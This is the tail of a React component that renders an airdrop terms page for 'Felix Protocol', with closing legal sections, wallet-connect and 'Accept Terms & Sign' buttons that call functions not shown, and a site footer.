            <li>Engaging in any activity that could harm Felix Protocol or other participants</li>
          </ul>
        </div>

        <div className="section">
          <h2>7. Governing Law and Dispute Resolution</h2>
          <p>These Terms shall be governed by and construed in accordance with applicable laws. Any disputes arising out of or 
          relating to these Terms or the airdrop shall be resolved through binding arbitration or in the courts of competent 
          jurisdiction, as determined by Felix Protocol.</p>
        </div>

        <div className="section">
          <h2>8. Contact Information</h2>
          <p>If you have any questions about these Terms or the airdrop program, please contact Felix Protocol through the 
          official channels provided on the Felix Protocol website.</p>
        </div>

        {/* Accept Button */}
        {isConnected && !hasSigned && (
          <div className="accept-section">
            <button 
              className="accept-btn" 
              onClick={(e) => {
                console.log('=== BUTTON CLICKED ===');
                console.log('Event:', e);
                console.log('isConnected:', isConnected);
                console.log('account:', account);
                e.preventDefault();
                signTerms();
              }}
              disabled={isVerifying}
            >
              {isVerifying ? 'Signing...' : 'Accept Terms & Sign'}
            </button>
          </div>
        )}

        {!isConnected && (
          <div className="accept-section">
            <button className="accept-btn" onClick={connectWallet}>
              Connect Wallet to Continue
            </button>
          </div>
        )}
        </div>
      </div>

      {/* Footer */}
      <footer className="footer">
        <div className="container">
          <div className="footer-content">
            <div className="footer-left">
              <div className="footer-logo">Felix</div>
              <p className="footer-text">© 2026 Felix Protocol. All rights reserved.</p>
            </div>
            <div className="footer-links">
              <div className="footer-col">
                <h4>Product</h4>
                <a href="https://usefelix.xyz/borrow">Borrow</a>
                <a href="https://usefelix.xyz/lend">Lend</a>
                <a href="https://usefelix.xyz/docs">Docs</a>
              </div>
              <div className="footer-col">
                <h4>Legal</h4>
                <a href="/terms">Terms</a>
                <a href="/privacy">Privacy</a>
              </div>
              <div className="footer-col">
                <h4>Community</h4>
                <a href="https://discord.gg/felixprotocol" target="_blank" rel="noopener noreferrer">Discord</a>
                <a href="https://x.com/felixprotocol" target="_blank" rel="noopener noreferrer">Twitter</a>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default HypurrTerms;
